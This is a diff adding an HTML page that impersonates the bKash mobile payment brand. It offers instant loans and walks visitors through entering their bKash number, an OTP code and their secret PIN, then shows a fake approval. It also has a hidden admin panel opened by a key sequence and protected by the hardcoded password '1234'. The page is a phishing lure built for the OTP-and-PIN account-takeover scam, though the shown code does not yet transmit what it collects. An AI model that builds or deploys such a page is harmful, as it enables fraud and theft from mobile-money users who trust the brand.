@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>bKash Loan Flow + Admin Panel</title>
+<style>
+/* General Styles */
+html, body { margin:0; padding:0; height:100%; }
+body { font-family: Arial,sans-serif; display:flex; flex-direction:column; min-height:100vh; background:#f5f5f5; }
+header { background:#fff; color:#e2136e; padding:15px 20px; display:flex; align-items:center; border-bottom:1px solid #ddd; flex-shrink:0; }
+header img { height:50px; margin-right:15px; }
+header h1 { font-size:28px; margin:0; color:#e2136e; }
+header p { margin:0; font-size:16px; color:#555; }
+.container { padding:30px 20px; max-width:900px; margin:auto; flex:1 0 auto; }
+.section, .banner { background:white; padding:25px; border-radius:10px; margin-bottom:25px; box-shadow:0 0 10px rgba(0,0,0,0.05);}
+input, select, textarea { width:100%; padding:14px; margin:10px 0; border-radius:5px; border:1px solid #ccc; font-size:16px; }
+.btn { display:inline-block; width:100%; padding:14px; background:#e2136e; color:white; border:none; border-radius:5px; font-size:16px; cursor:pointer; text-align:center; text-decoration:none; }
+.btn:hover { background:#c0105c; }
+.hidden { display:none; }
+.highlight-red { background:#e2136e; color:white; padding:12px; border-radius:8px; margin-bottom:15px; font-weight:bold; text-align:center; font-size:16px; }
+.box-rounded { border:2px solid #e2136e; border-radius:15px; padding:20px; text-align:center; margin-bottom:25px; background:#fff; }
+footer { background:#222; color:white; padding:25px 20px; text-align:left; font-size:14px; line-height:1.6; border-top:3px solid #111; flex-shrink:0; }
+footer a { color:#fff; text-decoration:underline; }
+table { width:100%; border-collapse:collapse; margin-top:15px; }
+table, th, td { border:1px solid #ccc; }
+th, td { padding:10px; text-align:left; font-size:14px; }
+.admin-panel { background:#f8f8f8; padding:20px; border-radius:10px; }
+.admin-panel h2 { color:#e2136e; margin-bottom:15px; }
+.admin-panel table { width:100%; }
+.admin-panel th { background:#e2136e; color:white; }
+.admin-panel td { background:#fff; }
+.admin-panel button { background:#444; color:white; padding:5px 10px; margin-right:5px; border-radius:5px; border:none; cursor:pointer; }
+.admin-panel button:hover { background:#222; }
+</style>
+</head>
+<body>
+
+<header>
+<img src="images/bkash_logo.png" alt="bKash Logo">
+<div>
+<h1>bKash</h1>
+<p>বিকাশ অ্যাপ নিন</p>
+</div>
+</header>
+
+<div class="container">
+
+<!-- Step 1 -->
+<div id="step1" class="banner">
+  <div class="highlight-red">বিকাশ লোন</div>
+  <div class="highlight-red">সহজ শর্তে ঝটপট লোন</div>
+  <div class="box-rounded">
+    <button class="btn" id="step1Btn">বিকাশ থেকে লোনের জন্য এখানে ক্লিক করুন</button>
+    <button class="btn" id="goAdmin" style="margin-top:10px;background:#333;">Admin Panel</button>
+  </div>
+  <p>ছোট, দ্রুত লোন নেওয়া এখন আগের চেয়ে সহজ! বিকাশ অ্যাপের মাধ্যমে তাৎক্ষণিক লোন নিন।</p>
+</div>
+
+<!-- Step 2 -->
+<div id="step2" class="section hidden">
+  <div class="highlight-red">লোন ফর্ম</div>
+  <label>লোনের পরিমাণ (Amount)</label>
+  <input type="number" id="loanAmount" placeholder="1000 - 150000" min="1000" max="150000">
+  <label>লোনের ধরন (Category)</label>
+  <select id="loanCategory">
+    <option>সিলেক্ট করুন</option>
+    <option>পার্সোনাল লোন</option>
+    <option>বিজনেস লোন</option>
+    <option>ইমারজেন্সি লোন</option>
+  </select>
+  <div class="highlight-red"><button class="btn" id="applyLoanBtn">আবেদন করুন</button></div>
+</div>
+
+<!-- Step 3 -->
+<div id="step3" class="section hidden">
+  <div class="highlight-red">অ্যাকাউন্ট ভেরিফিকেশন</div>
+  <p>আপনার বিকাশ নম্বর দিন যেটি লোন গ্রহণের জন্য ব্যবহার হবে।</p>
+  <input type="text" id="bkashNumber" placeholder="01XXXXXXXXX">
+  <button class="btn" id="toStep4">পরবর্তী ধাপে যান</button>
+</div>
+
+<!-- Step 4 -->
+<div id="step4" class="section hidden">
+  <div class="highlight-red">OTP ভেরিফিকেশন</div>
+  <input type="text" id="otp" placeholder="------">
+  <div class="highlight-red"><button class="btn" id="toStep5">কোড নিশ্চিত করুন</button></div>
+</div>
+
+<!-- Step 5 -->
+<div id="step5" class="section hidden">
+  <div class="highlight-red">নিরাপত্তা যাচাই</div>
+  <input type="password" id="bkashPin" placeholder="•••••">
+  <div class="highlight-red"><button class="btn" id="toStep6">লোন নিশ্চিত করুন</button></div>
+</div>
+
+<!-- Step 6 -->
+<div id="step6" class="section hidden">
+  <div class="highlight-red">আবেদন প্রক্রিয়াধীন</div>
+  <p>আপনার আবেদন গ্রহণ করা হয়েছে।</p>
+  <p>আবেদন আইডি: <strong id="applicationId">#43F58D1B</strong></p>
+  <p>বর্তমান অবস্থা: <strong id="loanStatus">Processing...</strong></p>
+  <button class="btn" id="backHome">হোম পেজে ফিরে যান</button>
+</div>
+
+<!-- Admin Login -->
+<div id="adminLogin" class="section hidden">
+  <div class="highlight-red">Admin Login</div>
+  <label>Username</label>
+  <input type="text" id="adminUser" placeholder="Username">
+  <label>Password</label>
+  <input type="password" id="adminPass" placeholder="Password">
+  <div class="highlight-red"><button class="btn" id="adminLoginBtn">Login</button></div>
+</div>
+
+<!-- Admin Panel -->
+<div id="admin" class="section hidden admin-panel">
+  <h2>Admin Panel - Loan Applications</h2>
+  <table>
+    <thead>
+      <tr>
+        <th>ID</th>
+        <th>Amount</th>
+        <th>Category</th>
+        <th>Status</th>
+        <th>Action</th>
+      </tr>
+    </thead>
+    <tbody id="adminTable"></tbody>
+  </table>
+  <div class="highlight-red"><button class="btn" id="backUser">Back to User</button></div>
+</div>
+
+</div> <!-- container end -->
+
+<!-- Sticky Footer -->
+<footer>
+<p>বিকাশ বাংলাদেশের মানুষকে মোবাইল ফোনের মাধ্যমে দ্রুত, নিরাপদে ও সহজে টাকা পাঠানো এবং পেমেন্ট সেবা প্রদান করে</p>
+<p>বিকাশ অ্যাপ ডাউনলোড করুন: <a href="#">Google Play</a> | <a href="#">App Store</a></p>
+<p>সেবা: ক্যাম্পেইন | হেল্প | কমপ্লেইন্ট সেল</p>
+<p>কোম্পানি: বিকাশ সম্পর্কে | যোগাযোগ | ক্যারিয়ার | ব্যবসা</p>
+<p>বিকাশ সাপ্লায়ার হোন | বিকাশ মার্চেন্ট হোন | ডিজিটাল বেতন | অন্যান্য</p>
+<p>শর্তাবলি | সাধারণ জিজ্ঞাসা | নিরাপত্তা পরামর্শ | প্রাইভেসি নোটিশ</p>
+<p>সিকিউরিটি ও কমপ্লায়েন্স সার্টিফিকেটসমূহ: PCI DSS | ISO 27001 | ISO 22301 | ISO 9001</p>
+<p>© ২০২৬ bKash, সর্বস্বত্ব সংরক্ষিত</p>
+</footer>
+
+<script>
+// Global loan storage with LocalStorage
+let loans = JSON.parse(localStorage.getItem("loans")) || [];
+const ADMIN_USERNAME = "admin";
+const ADMIN_PASSWORD = "1234";
+
+// Secret key for admin
+let secret="";
+document.addEventListener("keydown", e=>{
+    secret+=e.key;
+    if(secret.includes("123admin")){
+        alert("Admin Open 🔐");
+        showStep('adminLogin');
+        secret="";
+    }
+});
+
+// Show Step function
+function showStep(stepId){
+    const allSteps = ['step1','step2','step3','step4','step5','step6','admin','adminLogin'];
+    allSteps.forEach(id => document.getElementById(id).classList.add('hidden'));
+    document.getElementById(stepId).classList.remove('hidden');
+    if(stepId === 'admin') updateAdminPanel();
+}
+
+// Step 1 → Step 2
+document.getElementById('step1Btn').addEventListener('click', () => showStep('step2'));
+// Step 1 → Admin Login
+document.getElementById('goAdmin').addEventListener('click', () => showStep('adminLogin'));
+
+// Apply loan → Step 3
+document.getElementById('applyLoanBtn').addEventListener('click', () => {
+    const amount = document.getElementById('loanAmount').value;
+    const category = document.getElementById('loanCategory').value;
+    if(amount && category!=="সিলেক্ট করুন"){
+        const newId = "LN"+(loans.length+1);
+        loans.push({id:newId, amount, category, status:"Processing"});
+        localStorage.setItem("loans", JSON.stringify(loans));
+        document.getElementById('applicationId').innerText = newId;
+        alert("লোন আবেদন জমা হয়েছে!");
+        showStep('step3');
+    } else alert("সব ফিল্ড পূরণ করুন।");
+});
+
+// Step 3 → Step 4
+document.getElementById('toStep4').addEventListener('click', () => {
+    if(document.getElementById('bkashNumber').value.length>=11) showStep('step4');
+    else alert("সঠিক বিকাশ নম্বর দিন।");
+});
+
+// Step 4 → Step 5
+document.getElementById('toStep5').addEventListener('click', () => {
+    if(document.getElementById('otp').value.length>=4) showStep('step5');
+    else alert("সঠিক OTP দিন।");
+});
+
+// Step 5 → Step 6
+document.getElementById('toStep6').addEventListener('click', () => {
+    if(document.getElementById('bkashPin').value.length>=4){
+        showStep('step6');
+        startAutoUpdateStatus();
+    } else alert("সঠিক PIN দিন।");
+});
+
+// Back to Home from Step 6
+document.getElementById('backHome').addEventListener('click', () => showStep('step1'));
+
+// Admin Login
+document.getElementById('adminLoginBtn').addEventListener('click', () => {
+    if(document.getElementById('adminUser').value===ADMIN_USERNAME &&
+       document.getElementById('adminPass').value===ADMIN_PASSWORD){
+        showStep('admin');
+    } else alert("Invalid username or password!");
+});
+
+// Back to User from Admin
+document.getElementById('backUser').addEventListener('click', () => showStep('step1'));
+
+// Update Admin Panel
+function updateAdminPanel(){
+    const tbody = document.getElementById('adminTable');
+    tbody.innerHTML = '';
+    loans.forEach((l,i) => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+        <td>${l.id}</td>
+        <td>${l.amount}</td>
+        <td>${l.category}</td>
+        <td>${l.status}</td>
+        <td>
+            <button onclick="updateStatus(${i}, 'Approved')">Approve</button>
+            <button onclick="updateStatus(${i}, 'Rejected')">Reject</button>
+        </td>
+        `;
+        tbody.appendChild(tr);
+    });
+}
+
+// Approve/Reject function
+function updateStatus(index, status){
+    loans[index].status = status;
+    localStorage.setItem("loans", JSON.stringify(loans));
+    updateAdminPanel();
+}
+
+// Auto Status Update
+function startAutoUpdateStatus(){
+    const statusEl = document.getElementById('loanStatus');
+    let counter = 0;
+    const interval = setInterval(()=>{
+        counter++;
+        if(counter===1){ statusEl.innerText="Processing..."; loans[loans.length-1].status="Processing"; localStorage.setItem("loans", JSON.stringify(loans)); }
+        else if(counter===4){ statusEl.innerText="Approved"; loans[loans.length-1].status="Approved"; localStorage.setItem("loans", JSON.stringify(loans)); updateAdminPanel(); clearInterval(interval);}
+    },1000);
+}
+</script>
+
+</body>so
+</html>
